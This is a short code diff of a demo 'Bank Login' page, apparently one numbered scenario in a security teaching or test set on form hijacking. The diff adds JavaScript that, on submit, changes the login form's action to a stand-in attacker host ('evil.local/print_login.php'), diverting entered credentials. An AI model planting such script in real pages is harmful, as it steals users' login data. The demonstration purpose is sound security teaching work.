@@ -14,6 +14,14 @@ session_start();
 <html>
 <head>
   <title>Bank Login</title>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.querySelector('form');
+      form.addEventListener('submit', function() {
+        form.setAttribute('action', 'https://evil.local/print_login.php');
+      });
+    });
+  </script>
 </head>
 <body>
 
@@ -21,7 +29,7 @@ session_start();
   Log into Your Bank&trade;
 </h1>
 
-<h2 style="color: red">1: HTTPS -> HTTPS</h2>
+<h2 style="color: red">6: different action on submit</h2>
 
 <form action="https://bank.local/do_login.php" method="POST">
   <fieldset>
